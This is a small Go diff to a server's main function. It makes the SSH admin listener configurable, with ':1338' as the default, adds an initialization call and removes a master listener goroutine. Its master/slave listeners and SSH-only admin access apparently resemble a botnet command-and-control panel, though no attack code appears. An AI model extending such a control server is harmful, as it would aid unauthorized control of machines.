@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"log"
+	"strings"
 )
 
 var buildversion = 9.2
@@ -18,10 +19,17 @@ func main() {
 		log.Fatalf("Config: %v", err)
 	}
 
-	go Master() // Start the master listener in a separate goroutine
+	// Initialize shared services before starting network listeners.
+	OnStart()
+
+	// SSH is the only admin access path.
 	go NewAPI() // Start the API server in a separate goroutine
 	go Title()  // Start the title updater in a separate goroutine
-	go startSSHServer(":1338")
+	sshListener := strings.TrimSpace(Options.Templates.Server.Listener)
+	if sshListener == "" {
+		sshListener = ":1338"
+	}
+	go startSSHServer(sshListener)
 
 	// Execute the main slave listener
 	if err := Slave(); err != nil {
